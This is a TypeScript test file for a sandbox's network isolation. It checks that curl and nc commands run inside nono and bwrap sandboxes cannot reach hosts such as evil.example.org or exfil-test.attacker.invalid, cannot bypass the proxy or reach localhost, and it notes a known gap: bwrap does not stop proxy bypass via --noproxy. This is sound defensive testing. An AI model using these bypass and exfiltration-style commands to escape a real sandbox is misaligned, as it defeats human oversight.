import { test, expect, describe, afterEach } from "bun:test";
import { nonoRuntime } from "../../src/sandbox/nono";
import { createBwrapRuntime } from "../../src/sandbox/bwrap";
import type { SandboxCleanup } from "../../src/sandbox/runtime";
import { mkdtemp, rm, readFile } from "node:fs/promises";
import { join } from "node:path";
import { tmpdir } from "node:os";

// ── Helpers ──────────────────────────────────────────────────────────

const tmpDirs: string[] = [];
const cleanups: SandboxCleanup[] = [];

afterEach(async () => {
  for (const c of cleanups.splice(0)) c();
  for (const d of tmpDirs) {
    await rm(d, { recursive: true, force: true }).catch(() => {});
  }
  tmpDirs.length = 0;
});

async function makeTmpDir(): Promise<string> {
  const d = await mkdtemp(join(tmpdir(), "deer-sec-test-"));
  tmpDirs.push(d);
  return d;
}

function nonoRun(dir: string, cmd: string, allowlist: string[] = ["example.com"]) {
  const args = nonoRuntime.buildCommand(
    { worktreePath: dir, allowlist },
    ["sh", "-c", cmd],
  );
  return Bun.spawn(args, { stdout: "pipe", stderr: "pipe" });
}

async function bwrapRun(dir: string, cmd: string, allowlist: string[] = ["example.com"]) {
  const runtime = createBwrapRuntime();
  cleanups.push(await runtime.prepare!({ worktreePath: dir, allowlist }));
  const args = runtime.buildCommand(
    { worktreePath: dir, allowlist },
    ["sh", "-c", cmd],
  );
  return Bun.spawn(args, { stdout: "pipe", stderr: "pipe" });
}

// ── A1: Direct TCP bypass — Landlock TCP must block non-proxy connections ─

describe("nono network isolation", () => {
  test("direct HTTPS bypassing proxy is blocked by Landlock TCP", async () => {
    const dir = await makeTmpDir();
    const proc = nonoRun(
      dir,
      `curl --noproxy '*' --max-time 3 -s https://example.com > ${dir}/out.txt 2>&1 || echo BLOCKED > ${dir}/out.txt`,
    );
    await proc.exited;

    const content = await readFile(join(dir, "out.txt"), "utf-8");
    expect(content.trim()).toBe("BLOCKED");
  }, 10000);

  test("direct HTTP bypassing proxy is blocked by Landlock TCP", async () => {
    const dir = await makeTmpDir();
    const proc = nonoRun(
      dir,
      `curl --noproxy '*' --connect-timeout 2 -s http://example.com > ${dir}/out.txt 2>&1 || echo BLOCKED > ${dir}/out.txt`,
    );
    await proc.exited;

    const content = await readFile(join(dir, "out.txt"), "utf-8");
    expect(content.trim()).toBe("BLOCKED");
  }, 10000);

  test("allowlisted host is reachable through the proxy", async () => {
    const dir = await makeTmpDir();
    const proc = nonoRun(
      dir,
      `curl -s --max-time 5 https://example.com > ${dir}/out.txt 2>&1`,
    );
    await proc.exited;

    const content = await readFile(join(dir, "out.txt"), "utf-8");
    expect(content).toContain("Example Domain");
  }, 10000);

  test("non-allowlisted host is blocked through the proxy", async () => {
    const dir = await makeTmpDir();
    const proc = nonoRun(
      dir,
      `curl -s --max-time 5 https://evil.example.org > ${dir}/out.txt 2>&1 || echo BLOCKED > ${dir}/out.txt`,
    );
    await proc.exited;

    const content = await readFile(join(dir, "out.txt"), "utf-8");
    expect(content.trim()).toBe("BLOCKED");
  }, 10000);
});

// ── A2: Direct TCP to arbitrary ports ────────────────────────────────

describe("TCP port restrictions", () => {
  test("cannot open raw TCP to arbitrary host:port", async () => {
    const dir = await makeTmpDir();
    const proc = nonoRun(
      dir,
      `echo test | nc -w1 93.184.216.34 80 > ${dir}/out.txt 2>&1 || echo BLOCKED > ${dir}/out.txt`,
    );
    await proc.exited;

    const content = await readFile(join(dir, "out.txt"), "utf-8");
    expect(content.trim()).toBe("BLOCKED");
  }, 10000);

  test("cannot connect to localhost services directly", async () => {
    const dir = await makeTmpDir();
    const proc = nonoRun(
      dir,
      `curl --noproxy '*' -s --connect-timeout 1 http://127.0.0.1:8080 > ${dir}/out.txt 2>&1 || echo BLOCKED > ${dir}/out.txt`,
      [], // no allowlist
    );
    await proc.exited;

    const content = await readFile(join(dir, "out.txt"), "utf-8");
    expect(content.trim()).toBe("BLOCKED");
  }, 10000);
});

// ── A3: DNS exfiltration ─────────────────────────────────────────────

describe("DNS exfiltration", () => {
  test("DNS queries for non-allowlisted domains do not exfiltrate data", async () => {
    const dir = await makeTmpDir();
    // DNS resolution itself may work (UDP is not Landlock-filtered),
    // but the TCP connection that follows must be blocked.
    // This test verifies the end-to-end: even if DNS resolves,
    // the data cannot be sent over TCP.
    const proc = nonoRun(
      dir,
      `curl --noproxy '*' -s --max-time 2 http://exfil-test.attacker.invalid > ${dir}/out.txt 2>&1 || echo BLOCKED > ${dir}/out.txt`,
    );
    await proc.exited;

    const content = await readFile(join(dir, "out.txt"), "utf-8");
    expect(content.trim()).toBe("BLOCKED");
  }, 10000);
});

// ═══════════════════════════════════════════════════════════════════════
// bwrap network security tests
//
// bwrap network isolation is proxy-based (HTTP_PROXY/HTTPS_PROXY).
// Unlike nono/Landlock, bwrap does NOT block direct TCP at the kernel
// level. A process that ignores proxy env vars (e.g. --noproxy '*')
// can make direct connections. The proxy allowlist is the filtering layer.
// ═══════════════════════════════════════════════════════════════════════

describe("bwrap proxy-based network filtering", () => {
  test("allowlisted host is reachable through the proxy", async () => {
    const dir = await makeTmpDir();
    const proc = await bwrapRun(
      dir,
      `curl -s --max-time 5 https://example.com > ${dir}/out.txt 2>&1`,
    );
    await proc.exited;

    const content = await readFile(join(dir, "out.txt"), "utf-8");
    expect(content).toContain("Example Domain");
  }, 15000);

  test("non-allowlisted host is blocked through the proxy", async () => {
    const dir = await makeTmpDir();
    const proc = await bwrapRun(
      dir,
      `curl -s --max-time 5 https://evil.example.org > ${dir}/out.txt 2>&1 || echo BLOCKED > ${dir}/out.txt`,
    );
    await proc.exited;

    const content = await readFile(join(dir, "out.txt"), "utf-8");
    expect(content.trim()).toBe("BLOCKED");
  }, 15000);

  test("non-allowlisted host blocked even with HTTP", async () => {
    const dir = await makeTmpDir();
    const proc = await bwrapRun(
      dir,
      `curl -s --max-time 5 http://evil.example.org > ${dir}/out.txt 2>&1 || echo BLOCKED > ${dir}/out.txt`,
    );
    await proc.exited;

    const content = await readFile(join(dir, "out.txt"), "utf-8");
    expect(content.trim()).toBe("BLOCKED");
  }, 15000);
});

// NOTE: bwrap does NOT have kernel-level TCP blocking (no Landlock, no --unshare-net).
// A process that bypasses the proxy (e.g. curl --noproxy '*') can make direct TCP
// connections. This is a known limitation vs nono. Direct TCP tests are intentionally
// omitted here — they would pass (connections succeed), which is the opposite of
// the nono behaviour. The proxy is the sole network filtering layer for bwrap.
